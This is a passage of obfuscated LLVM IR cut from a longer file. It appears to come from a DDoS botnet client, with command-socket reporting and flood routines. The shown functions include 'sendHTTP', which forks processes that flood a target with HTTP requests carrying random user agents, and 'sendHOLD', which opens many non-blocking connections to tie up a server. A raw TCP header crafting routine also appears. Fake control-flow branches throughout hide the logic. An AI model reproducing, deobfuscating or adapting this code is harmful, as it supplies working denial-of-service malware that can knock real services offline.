  %674 = load i32, i32* %17, align 4
  %675 = trunc i32 %674 to i16
  %676 = call zeroext i16 @htons(i16 zeroext %675) #13
  %677 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 1
  store i16 %676, i16* %677, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %72
  %678 = load i8*, i8** %16, align 8
  %679 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %24, i32 0, i32 2
  %680 = call i32 @getHost(i8* %678, %struct.in_addr* %679)
  %681 = icmp ne i32 %680, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %93
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %124
  %682 = load i32, i32* @mainCommSock, align 4
  %683 = call i32 (i32, i8*, ...) @sockprintf(i32 %682, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i32 0, i32 0))
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %143
  %684 = load i32, i32* %19, align 4
  %685 = icmp eq i32 %684, 0
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %162
  store i32 0, i32* %27, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %268
  %686 = load i8*, i8** %20, align 8
  %687 = call i8* @strtok(i8* %686, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %687, i8** %31, align 8
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %302
  %688 = load i8*, i8** %31, align 8
  %689 = call i32 @strcmp(i8* %688, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.408, i32 0, i32 0)) #10
  %690 = icmp ne i32 %689, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %334
  %691 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %692 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %691, i32 0, i32 0
  %693 = bitcast %union.anon.1* %692 to %struct.anon.2*
  %694 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %693, i32 0, i32 4
  %695 = load i16, i16* %694, align 4
  %_ = sub i16 %695, -257
  %gen = mul i16 %_, -257
  %696 = and i16 %695, -257
  %_35 = sub i16 0, %696
  %gen36 = add i16 %_35, 256
  %_37 = sub i16 0, %696
  %gen38 = add i16 %_37, 256
  %_39 = sub i16 0, %696
  %gen40 = add i16 %_39, 256
  %_41 = shl i16 %696, 256
  %_42 = sub i16 0, %696
  %gen43 = add i16 %_42, 256
  %697 = or i16 %696, 256
  store i16 %697, i16* %694, align 4
  br label %originalBB34

originalBB47alteredBB:                            ; preds = %originalBB47, %362
  %698 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %699 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %698, i32 0, i32 0
  %700 = bitcast %union.anon.1* %699 to %struct.anon.2*
  %701 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %700, i32 0, i32 4
  %702 = load i16, i16* %701, align 4
  %_48 = shl i16 %702, -4097
  %_49 = sub i16 %702, -4097
  %gen50 = mul i16 %_49, -4097
  %_51 = shl i16 %702, -4097
  %_52 = sub i16 %702, -4097
  %gen53 = mul i16 %_52, -4097
  %_54 = sub i16 %702, -4097
  %gen55 = mul i16 %_54, -4097
  %_56 = shl i16 %702, -4097
  %_57 = shl i16 %702, -4097
  %703 = and i16 %702, -4097
  %_58 = sub i16 %703, 4096
  %gen59 = mul i16 %_58, 4096
  %_60 = sub i16 %703, 4096
  %gen61 = mul i16 %_60, 4096
  %_62 = sub i16 0, %703
  %gen63 = add i16 %_62, 4096
  %_64 = sub i16 %703, 4096
  %gen65 = mul i16 %_64, 4096
  %_66 = shl i16 %703, 4096
  %_67 = sub i16 %703, 4096
  %gen68 = mul i16 %_67, 4096
  %704 = or i16 %703, 4096
  store i16 %704, i16* %701, align 4
  br label %originalBB47

originalBB72alteredBB:                            ; preds = %originalBB72, %398
  %705 = load i32, i32* @mainCommSock, align 4
  %706 = load i8*, i8** %31, align 8
  %707 = call i32 (i32, i8*, ...) @sockprintf(i32 %705, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.412, i32 0, i32 0), i8* %706)
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %419
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %438
  %708 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i32 0, i32 0)) #2
  store i8* %708, i8** %31, align 8
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %456
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %473
  %709 = call i32 @rand_cmwc()
  %710 = trunc i32 %709 to i16
  %711 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %712 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %711, i32 0, i32 0
  %713 = bitcast %union.anon.1* %712 to %struct.anon.2*
  %714 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %713, i32 0, i32 5
  store i16 %710, i16* %714, align 2
  %715 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %716 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %715, i32 0, i32 0
  %717 = bitcast %union.anon.1* %716 to %struct.anon.2*
  %718 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %717, i32 0, i32 6
  store i16 0, i16* %718, align 4
  %719 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %720 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %719, i32 0, i32 0
  %721 = bitcast %union.anon.1* %720 to %struct.anon.2*
  %722 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %721, i32 0, i32 7
  store i16 0, i16* %722, align 2
  %723 = load i32, i32* %17, align 4
  %724 = icmp eq i32 %723, 0
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %590
  %725 = call i64 @time(i64* null) #2
  %726 = load i32, i32* %32, align 4
  %727 = sext i32 %726 to i64
  %728 = icmp sgt i64 %725, %727
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %616
  %729 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %729)
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %634
  br label %originalBB100
}

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [512 x i8], align 16
  %17 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %18, i8* bitcast ([3 x i8*]* @sendHTTP.connections to i8*), i64 24, i32 16, i1 false)
  %19 = call i64 @time(i64* null) #2
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %25 = load i8*, i8** %7, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #2
  %28 = srem i32 %27, 3
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #2
  %33 = sext i32 %32 to i64
  %34 = urem i64 %33, 36
  %35 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* %24, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.416, i32 0, i32 0), i8* %25, i8* %26, i8* %31, i8* %36) #2
  store i32 0, i32* %14, align 4
  br label %38

; <label>:38:                                     ; preds = %originalBBpart216, %6
  %39 = load i32, i32* %14, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %151

; <label>:42:                                     ; preds = %38
  %43 = call i32 @fork() #2
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %131

; <label>:45:                                     ; preds = %42
  %46 = load i32, i32* @x.93
  %47 = load i32, i32* @y.94
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = load i32, i32* @x.93
  %55 = load i32, i32* @y.94
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart28, %originalBBpart2
  %63 = load i32, i32* %15, align 4
  %64 = sext i32 %63 to i64
  %65 = call i64 @time(i64* null) #2
  %66 = icmp sgt i64 %64, %65
  br i1 %66, label %67, label %114

; <label>:67:                                     ; preds = %62
  %68 = load i32, i32* @x.93
  %69 = load i32, i32* @y.94
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i8*, i8** %8, align 8
  %77 = load i16, i16* %9, align 2
  %78 = call i32 @socket_connect(i8* %76, i16 zeroext %77)
  store i32 %78, i32* %17, align 4
  %79 = load i32, i32* %17, align 4
  %80 = icmp ne i32 %79, 0
  %81 = load i32, i32* @x.93
  %82 = load i32, i32* @y.94
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %80, label %89, label %97

; <label>:89:                                     ; preds = %originalBBpart24
  %90 = load i32, i32* %17, align 4
  %91 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i32 0, i32 0
  %93 = call i64 @strlen(i8* %92) #10
  %94 = call i64 @write(i32 %90, i8* %91, i64 %93)
  %95 = load i32, i32* %17, align 4
  %96 = call i32 @close(i32 %95)
  br label %97

; <label>:97:                                     ; preds = %89, %originalBBpart24
  %98 = load i32, i32* @x.93
  %99 = load i32, i32* @y.94
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %97
  %106 = load i32, i32* @x.93
  %107 = load i32, i32* @y.94
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %62

; <label>:114:                                    ; preds = %62
  %115 = load i32, i32* @x.93
  %116 = load i32, i32* @y.94
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %114
  call void @exit(i32 1) #14
  %123 = load i32, i32* @x.93
  %124 = load i32, i32* @y.94
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:131:                                    ; preds = %42
  br label %132

; <label>:132:                                    ; preds = %131
  %133 = load i32, i32* @x.93
  %134 = load i32, i32* @y.94
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %132
  %141 = load i32, i32* %14, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %14, align 4
  %143 = load i32, i32* @x.93
  %144 = load i32, i32* @y.94
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %38

; <label>:151:                                    ; preds = %38
  %152 = load i32, i32* @x.93
  %153 = load i32, i32* @y.94
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %151
  %160 = load i32, i32* @x.93
  %161 = load i32, i32* @y.94
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %45
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %168 = load i8*, i8** %8, align 8
  %169 = load i16, i16* %9, align 2
  %170 = call i32 @socket_connect(i8* %168, i16 zeroext %169)
  store i32 %170, i32* %17, align 4
  %171 = load i32, i32* %17, align 4
  %172 = icmp ne i32 %171, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %114
  call void @exit(i32 1) #14
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %132
  %173 = load i32, i32* %14, align 4
  %_ = sub i32 %173, 1
  %gen = mul i32 %_, 1
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %14, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %151
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %3
  br label %388

; <label>:34:                                     ; preds = %3
  %35 = load i32, i32* @x.95
  %36 = load i32, i32* @y.96
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %7, align 4
  %46 = zext i32 %45 to i64
  %47 = call i8* @llvm.stacksave()
  store i8* %47, i8** %10, align 8
  %48 = alloca %struct.state_t, i64 %46, align 16
  %49 = bitcast %struct.state_t* %48 to i8*
  %50 = load i32, i32* %7, align 4
  %51 = sext i32 %50 to i64
  %52 = mul i64 %51, 5
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 %52, i32 16, i1 false)
  %53 = call i64 @time(i64* null) #2
  %54 = load i32, i32* %6, align 4
  %55 = sext i32 %54 to i64
  %56 = add nsw i64 %53, %55
  %57 = trunc i64 %56 to i32
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* @x.95
  %59 = load i32, i32* @y.96
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %66

; <label>:66:                                     ; preds = %385, %originalBBpart2
  %67 = load i32, i32* @x.95
  %68 = load i32, i32* @y.96
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %66
  %75 = load i32, i32* %16, align 4
  %76 = sext i32 %75 to i64
  %77 = call i64 @time(i64* null) #2
  %78 = icmp sgt i64 %76, %77
  %79 = load i32, i32* @x.95
  %80 = load i32, i32* @y.96
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %78, label %87, label %386

; <label>:87:                                     ; preds = %originalBBpart28
  %88 = load i32, i32* @x.95
  %89 = load i32, i32* @y.96
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %87
  store i32 0, i32* %8, align 4
  %96 = load i32, i32* @x.95
  %97 = load i32, i32* @y.96
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %104

; <label>:104:                                    ; preds = %originalBBpart238, %originalBBpart212
  %105 = load i32, i32* %8, align 4
  %106 = load i32, i32* %7, align 4
  %107 = icmp slt i32 %105, %106
  br i1 %107, label %108, label %385

; <label>:108:                                    ; preds = %104
  %109 = load i32, i32* @x.95
  %110 = load i32, i32* @y.96
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %108
  %117 = load i32, i32* %8, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %118
  %120 = getelementptr inbounds %struct.state_t, %struct.state_t* %119, i32 0, i32 1
  %121 = load i8, i8* %120, align 4
  %122 = zext i8 %121 to i32
  %123 = load i32, i32* @x.95
  %124 = load i32, i32* @y.96
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  switch i32 %122, label %365 [
    i32 0, label %131
    i32 1, label %194
    i32 2, label %279
  ]

; <label>:131:                                    ; preds = %originalBBpart216
  %132 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %133 = load i32, i32* %8, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %134
  %136 = getelementptr inbounds %struct.state_t, %struct.state_t* %135, i32 0, i32 0
  store i32 %132, i32* %136, align 8
  %137 = load i32, i32* %8, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %138
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %139, i32 0, i32 0
  %141 = load i32, i32* %140, align 8
  %142 = load i32, i32* %8, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %143
  %145 = getelementptr inbounds %struct.state_t, %struct.state_t* %144, i32 0, i32 0
  %146 = load i32, i32* %145, align 8
  %147 = call i32 (i32, i32, ...) @fcntl(i32 %146, i32 3, i8* null)
  %148 = or i32 %147, 2048
  %149 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 4, i32 %148)
  %150 = load i32, i32* %8, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %151
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 8
  %155 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %156 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %156, %struct.sockaddr** %155, align 8
  %157 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %158 = load %struct.sockaddr*, %struct.sockaddr** %157, align 8
  %159 = call i32 @connect(i32 %154, %struct.sockaddr* %158, i32 16)
  %160 = icmp ne i32 %159, -1
  br i1 %160, label %165, label %161

; <label>:161:                                    ; preds = %131
  %162 = call i32* @__errno_location() #13
  %163 = load i32, i32* %162, align 4
  %164 = icmp ne i32 %163, 115
  br i1 %164, label %165, label %172

; <label>:165:                                    ; preds = %161, %131
  %166 = load i32, i32* %8, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %167
  %169 = getelementptr inbounds %struct.state_t, %struct.state_t* %168, i32 0, i32 0
  %170 = load i32, i32* %169, align 8
  %171 = call i32 @close(i32 %170)
  br label %193

; <label>:172:                                    ; preds = %161
  %173 = load i32, i32* @x.95
  %174 = load i32, i32* @y.96
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %172
  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %182
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %183, i32 0, i32 1
  store i8 1, i8* %184, align 4
  %185 = load i32, i32* @x.95
  %186 = load i32, i32* @y.96
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %193

; <label>:193:                                    ; preds = %originalBBpart220, %165
  br label %365

; <label>:194:                                    ; preds = %originalBBpart216
  br label %195

; <label>:195:                                    ; preds = %194
  %196 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %197 = getelementptr inbounds [16 x i64], [16 x i64]* %196, i64 0, i64 0
  %198 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %197) #2, !srcloc !7
  %199 = extractvalue { i64, i64* } %198, 0
  %200 = extractvalue { i64, i64* } %198, 1
  %201 = trunc i64 %199 to i32
  store i32 %201, i32* %18, align 4
  %202 = ptrtoint i64* %200 to i64
  %203 = trunc i64 %202 to i32
  store i32 %203, i32* %19, align 4
  br label %204

; <label>:204:                                    ; preds = %195
  br label %205

; <label>:205:                                    ; preds = %204
  %206 = load i32, i32* %8, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %207
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %208, i32 0, i32 0
  %210 = load i32, i32* %209, align 8
  %211 = srem i32 %210, 64
  %212 = zext i32 %211 to i64
  %213 = shl i64 1, %212
  %214 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %215 = load i32, i32* %8, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %216
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 8
  %220 = sdiv i32 %219, 64
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds [16 x i64], [16 x i64]* %214, i64 0, i64 %221
  %223 = load i64, i64* %222, align 8
  %224 = or i64 %223, %213
  store i64 %224, i64* %222, align 8
  %225 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %225, align 8
  %226 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %226, align 8
  %227 = load i32, i32* %8, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %228
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 8
  %232 = add nsw i32 %231, 1
  %233 = call i32 @select(i32 %232, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %233, i32* %15, align 4
  %234 = load i32, i32* %15, align 4
  %235 = icmp eq i32 %234, 1
  br i1 %235, label %236, label %263

; <label>:236:                                    ; preds = %205
  store i32 4, i32* %13, align 4
  %237 = load i32, i32* %8, align 4
  %238 = sext i32 %237 to i64
  %239 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %238
  %240 = getelementptr inbounds %struct.state_t, %struct.state_t* %239, i32 0, i32 0
  %241 = load i32, i32* %240, align 8
  %242 = bitcast i32* %14 to i8*
  %243 = call i32 @getsockopt(i32 %241, i32 1, i32 4, i8* %242, i32* %13) #2
  %244 = load i32, i32* %14, align 4
  %245 = icmp ne i32 %244, 0
  br i1 %245, label %246, label %257

; <label>:246:                                    ; preds = %236
  %247 = load i32, i32* %8, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %248
  %250 = getelementptr inbounds %struct.state_t, %struct.state_t* %249, i32 0, i32 0
  %251 = load i32, i32* %250, align 8
  %252 = call i32 @close(i32 %251)
  %253 = load i32, i32* %8, align 4
  %254 = sext i32 %253 to i64
  %255 = getelementptr inbounds %struct.state_t, %struct.state_t* %48, i64 %254
